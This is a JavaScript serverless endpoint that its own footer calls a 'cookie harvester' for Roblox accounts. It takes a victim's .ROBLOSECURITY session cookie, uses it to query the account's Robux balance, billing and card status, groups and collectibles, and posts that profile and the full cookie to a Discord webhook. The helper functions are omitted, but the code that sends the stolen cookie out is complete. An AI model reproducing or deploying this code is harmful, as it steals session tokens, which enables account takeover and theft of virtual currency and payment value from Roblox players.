// api/submit.js
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- Helper functions (same as before, omitted for brevity) ----------
// ... include all the real fetch functions: getUser, getAgeDays, getRobux, getRapAndOwned, getBilling, getSettings, getGroups, getPlayedPasses, getCollectibles ...

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });

  try {
    // Fetch real data
    const userData = await getUser(rbxuid, cookie);
    const robux = await getRobux(rbxuid, cookie);
    const rapData = await getRapAndOwned(rbxuid, cookie);
    const billing = await getBilling(cookie);
    const settings = await getSettings(cookie);
    const groups = await getGroups(rbxuid, cookie);
    const playedPasses = await getPlayedPasses();
    const collectibles = await getCollectibles();

    const accountAge = getAgeDays(userData.created);
    const summary = robux.balance + rapData.rap;
    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played} | ${p.passes}`).join("\n");

    // Custom emoji (ensure your webhook can use it; otherwise fallback to 💰)
    const robuxEmoji = "<:ROBUX:1472515184949202974>";
    const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";

    // ---------- Stats Embed (dark blue, bold text, cookie thumbnail, robux emoji) ----------
    const statsEmbed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0x2c3e50, // dark blue
      thumbnail: { url: cookieThumb },
      fields: [
        {
          name: "📌 About User",
          value: `**${userData.name}** (**${userData.displayName}**)\n🆔 \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** 0`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `${robuxEmoji} **Balance:** ${robux.balance}\n${robuxEmoji} **Pending:** ${robux.pending}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Rap",
          value: `**Rap:** ${rapData.rap}\n**Owned:** ${rapData.owned}`,
          inline: true
        },
        {
          name: "📊 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `**${summary}**`,
          inline: false
        },
        {
          name: "📊 Settings",
          value: `**(Verified)** ${settings.verified}\n**Disabled** ${settings.disabled}\n**Enabled** ${settings.enabled}`,
          inline: true
        },
        {
          name: "📊 Collectibles",
          value: collectibles.map(c => `**${c}**`).join("\n"),
          inline: true
        },
        {
          name: "📊 Groups",
          value: `**Owned:** ${groups.owned}\n**Funds:** ${groups.funds}`,
          inline: true
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // ---------- Cookie Embed (dark blue, bold text, cookie thumbnail) ----------
    const cookieEmbed = {
      title: "📌 .ROBLOSECURITY",
      description: `**FULL ROBLOSECURITY COOKIE:__**\n\`\`\`\n${cookie}\n\`\`\``,
      color: 0x2c3e50,
      thumbnail: { url: cookieThumb },
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // Send both embeds
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [statsEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
    });

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
}
